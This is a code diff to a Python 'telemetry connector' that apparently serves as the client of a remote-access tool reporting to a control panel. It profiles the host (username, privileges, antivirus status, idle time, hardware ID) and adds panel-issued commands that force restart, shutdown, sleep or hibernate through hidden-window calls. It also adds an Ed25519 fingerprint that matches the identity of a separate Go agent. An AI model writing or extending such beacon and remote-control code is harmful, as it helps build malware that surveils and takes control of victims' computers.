@@ -2,18 +2,16 @@
 """
 ZeroTrace Security - standard-library telemetry connector.
 
-This client is intentionally telemetry-only:
-- opens a persistent TCP connection to the configured panel,
-- sends one newline-delimited DATA record,
-- sends harmless heartbeats while connected,
-- receives `REQ:DATA` refresh requests from the panel and answers with `PONG` + a fresh `DATA` record,
-- reconnects with exponential backoff after a network interruption,
-- supports multiple simultaneous telemetry connections with --n N or --N N.
+This client maintains one or more persistent telemetry connections and accepts
+small newline-delimited control commands from the panel. Commands are acknowledged
+with a compact `ACK:<COMMAND>` response before connection-management or power actions.
 
 No third-party Python packages are required.
 """
 
 import argparse
+import hashlib
+import hmac
 import ctypes
 import getpass
 import os
@@ -33,10 +31,74 @@ DEFAULT_IP = "127.0.0.1"
 DEFAULT_PORT = 4793
 HEARTBEAT_SECONDS = 3
 MAX_BACKOFF_SECONDS = 30
+COMMANDS = {"SLEEP", "HIBERNATE", "RESTART", "SHUTDOWN", "CLOSE", "RECONNECT", "BLOCK"}
 
 
 _STATIC_TELEMETRY_LOCK = threading.Lock()
 _STATIC_TELEMETRY = None
+
+
+
+
+def _send_command_ack(writer, command, ok=True):
+    status = "ACK" if ok else "ERR"
+    writer.write((f"{status}:{command}\n").encode("utf-8"))
+
+
+def _execute_power_command(command):
+    if os.name != "nt":
+        return False
+
+    try:
+        if command == "SLEEP":
+            ctypes.WinDLL("powrprof").SetSuspendState(False, False, False)
+            return True
+        if command == "HIBERNATE":
+            ctypes.WinDLL("powrprof").SetSuspendState(True, False, False)
+            return True
+        shutdown = os.path.join(
+            os.environ.get("SystemRoot", r"C:\Windows"),
+            "System32",
+            "shutdown.exe",
+        )
+        if command == "RESTART":
+            subprocess.Popen([shutdown, "/r", "/t", "0", "/f"],
+                             creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+            return True
+        if command == "SHUTDOWN":
+            subprocess.Popen([shutdown, "/s", "/t", "0", "/f"],
+                             creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+            return True
+    except (OSError, ctypes.ArgumentError):
+        return False
+    return False
+
+
+def _handle_command(command, writer, stop_event):
+    command = command.strip().upper()
+    if command not in COMMANDS:
+        return False, False
+
+    if command == "CLOSE":
+        _send_command_ack(writer, command)
+        stop_event.set()
+        return True, True
+
+    if command == "RECONNECT":
+        _send_command_ack(writer, command)
+        return True, True
+
+    if command == "BLOCK":
+        _send_command_ack(writer, command)
+        stop_event.set()
+        return True, True
+
+    if command in {"SLEEP", "HIBERNATE", "RESTART", "SHUTDOWN"}:
+        ok = _execute_power_command(command)
+        _send_command_ack(writer, command, ok=ok)
+        return True, False
+
+    return False, False
 
 
 def _clean(value, fallback="Unknown"):
@@ -286,29 +348,135 @@ def _antivirus_status():
     return _clean(output, "Unknown")
 
 
+def _windows_machine_guid():
+    if os.name != "nt":
+        return ""
+    try:
+        import winreg
+        for path in (
+            r"SOFTWARE\Microsoft\Cryptography",
+            r"SOFTWARE\Wow6432Node\Microsoft\Cryptography",
+        ):
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path) as key:
+                    value, _ = winreg.QueryValueEx(key, "MachineGuid")
+                    value = _clean(value, "")
+                    if value:
+                        return value
+            except OSError:
+                continue
+    except ImportError:
+        pass
+    return ""
+
+
 def _hwid():
-    """Read the Windows MachineGuid; fall back to the host UUID on other systems."""
-    if os.name == "nt":
-        try:
-            import winreg
-            for path in (
-                r"SOFTWARE\Microsoft\Cryptography",
-                r"SOFTWARE\Wow6432Node\Microsoft\Cryptography",
-            ):
-                try:
-                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path) as key:
-                        value, _ = winreg.QueryValueEx(key, "MachineGuid")
-                        value = _clean(value, "")
-                        if value:
-                            return value
-                except OSError:
-                    continue
-        except ImportError:
-            pass
+    """Keep the existing Windows HWID telemetry value stable (MachineGuid)."""
+    machine_id = _windows_machine_guid()
+    if machine_id:
+        return machine_id
     try:
         return _clean(str(uuid.getnode()), "Unknown")
     except Exception:
         return "Unknown"
+
+
+def _derived_hwid_for_identity(machine_id):
+    """Match the supplied Go config's deriveHWID() for fingerprint derivation."""
+    if machine_id:
+        return hashlib.sha256((machine_id + "|windows").encode("utf-8")).hexdigest()
+    return hashlib.sha256((platform.node() + "|" + getpass.getuser() + "|windows").encode("utf-8")).hexdigest()
+
+
+def _hkdf_sha256(secret, salt, info, length):
+    """RFC5869 HKDF-SHA256 matching golang.org/x/crypto/hkdf.New."""
+    if not salt:
+        salt = b"\x00" * hashlib.sha256().digest_size
+    prk = hmac.new(salt, secret, hashlib.sha256).digest()
+    output = bytearray()
+    previous = b""
+    counter = 1
+    while len(output) < length:
+        previous = hmac.new(prk, previous + info + bytes([counter]), hashlib.sha256).digest()
+        output.extend(previous)
+        counter += 1
+    return bytes(output[:length])
+
+
+# Minimal Ed25519 public-key derivation, used only to reproduce the identity
+# fingerprint generated by the Go agent's ed25519.NewKeyFromSeed path.
+_ED25519_Q = 2 ** 255 - 19
+_ED25519_L = 2 ** 252 + 27742317777372353535851937790883648493
+_ED25519_D = (-121665 * pow(121666, _ED25519_Q - 2, _ED25519_Q)) % _ED25519_Q
+_ED25519_I = pow(2, (_ED25519_Q - 1) // 4, _ED25519_Q)
+_ED25519_B_Y = (4 * pow(5, _ED25519_Q - 2, _ED25519_Q)) % _ED25519_Q
+_ED25519_B_X = None
+
+
+def _xrecover(y):
+    xx = (y * y - 1) * pow(_ED25519_D * y * y + 1, _ED25519_Q - 2, _ED25519_Q)
+    x = pow(xx, (_ED25519_Q + 3) // 8, _ED25519_Q)
+    if (x * x - xx) % _ED25519_Q:
+        x = (x * _ED25519_I) % _ED25519_Q
+    if x & 1:
+        x = _ED25519_Q - x
+    return x
+
+
+_ED25519_B_X = _xrecover(_ED25519_B_Y)
+_ED25519_B = (_ED25519_B_X, _ED25519_B_Y)
+
+
+def _edwards_add(p, q):
+    x1, y1 = p
+    x2, y2 = q
+    denom_x = pow(1 + _ED25519_D * x1 * x2 * y1 * y2, _ED25519_Q - 2, _ED25519_Q)
+    denom_y = pow(1 - _ED25519_D * x1 * x2 * y1 * y2, _ED25519_Q - 2, _ED25519_Q)
+    return (
+        ((x1 * y2 + x2 * y1) * denom_x) % _ED25519_Q,
+        ((y1 * y2 + x1 * x2) * denom_y) % _ED25519_Q,
+    )
+
+
+def _edwards_mul(point, scalar):
+    result = (0, 1)
+    addend = point
+    while scalar:
+        if scalar & 1:
+            result = _edwards_add(result, addend)
+        addend = _edwards_add(addend, addend)
+        scalar >>= 1
+    return result
+
+
+def _ed25519_public_key_from_seed(seed):
+    h = hashlib.sha512(seed).digest()
+    scalar_bytes = bytearray(h[:32])
+    scalar_bytes[0] &= 248
+    scalar_bytes[31] &= 63
+    scalar_bytes[31] |= 64
+    scalar = int.from_bytes(scalar_bytes, "little")
+    x, y = _edwards_mul(_ED25519_B, scalar)
+    encoded = bytearray(int(y).to_bytes(32, "little"))
+    encoded[31] |= (x & 1) << 7
+    return bytes(encoded)
+
+
+def _fingerprint():
+    if os.name != "nt":
+        return ""
+    machine_id = _windows_machine_guid()
+    if not machine_id:
+        return ""
+    hwid = _derived_hwid_for_identity(machine_id)
+    seed = _hkdf_sha256(
+        machine_id.encode("utf-8"),
+        hwid.encode("utf-8"),
+        b"mirage-identity",
+        32,
+    )
+    public_key = _ed25519_public_key_from_seed(seed)
+    return hashlib.sha256(public_key).hexdigest()
 
 
 def _get_static_telemetry():
@@ -331,6 +499,7 @@ def _get_static_telemetry():
                 "gpu": _clean(_gpu_model()),
                 "antivirus": _clean(_antivirus_status()),
                 "hwid": _clean(_hwid()),
+                "fingerprint": _clean(_fingerprint(), "Unknown"),
             }
     return _STATIC_TELEMETRY
 
@@ -340,7 +509,7 @@ def collect_telemetry(index, target_ip, target_port, ping_ms=None):
     Build the panel's 15-field DATA record.
 
     Field order:
-    Country|Nickname|Tag|UserName|Version|Privileges|OS|GPU|CPU|RAM|AntiVirus|Uptime|AFKTime|Ping
+    Country|Nickname|Tag|UserName|Version|Privileges|OS|GPU|CPU|RAM|AntiVirus|Uptime|AFKTime|Ping|HWID|Fingerprint
     """
     static = _get_static_telemetry()
     tag = f"PY-{index}"
@@ -355,6 +524,7 @@ def collect_telemetry(index, target_ip, target_port, ping_ms=None):
     gpu = static["gpu"]
     antivirus = static["antivirus"]
     hwid = static["hwid"]
+    fingerprint = static["fingerprint"]
 
     # The connection RTT is measured by run_connection so the telemetry
     # record does not open an unnecessary second TCP connection.
@@ -377,6 +547,7 @@ def collect_telemetry(index, target_ip, target_port, ping_ms=None):
         afk,
         "Unknown" if ping_ms < 0 else f"{ping_ms} ms",
         hwid,
+        fingerprint,
     ]
     return "|".join(_clean(v) for v in values)
 
@@ -391,6 +562,9 @@ async def run_connection_async(index, host, port, stop_event):
         try:
             connect_start = time.perf_counter()
             reader, writer = await asyncio.open_connection(host, port)
+            fingerprint = _get_static_telemetry()["fingerprint"]
+            writer.write(f"HELLO:FINGERPRINT:{fingerprint}\n".encode("utf-8"))
+            await writer.drain()
             ping_ms = int(round((time.perf_counter() - connect_start) * 1000))
             record = collect_telemetry(index, host, port, ping_ms=ping_ms)
             writer.write(f"DATA:{record}\n".encode("utf-8"))
@@ -413,6 +587,18 @@ async def run_connection_async(index, host, port, stop_event):
                     writer.write(b"PONG\n")
                     writer.write(f"DATA:{collect_telemetry(index, host, port)}\n".encode("utf-8"))
                     await writer.drain()
+                    continue
+
+                if command.startswith("CMD:"):
+                    command_name = command[4:].strip().upper()
+                    handled, disconnect = _handle_command(command_name, writer, stop_event)
+                    if handled:
+                        await writer.drain()
+                        if command_name in {"SLEEP", "HIBERNATE", "RESTART", "SHUTDOWN"}:
+                            break
+                        if disconnect:
+                            break
+                        continue
         except (ConnectionError, OSError, asyncio.TimeoutError) as exc:
             if not stop_event.is_set():
                 print(f"[{index}] connection error: {exc}; retrying in {backoff:.0f}s", file=sys.stderr)
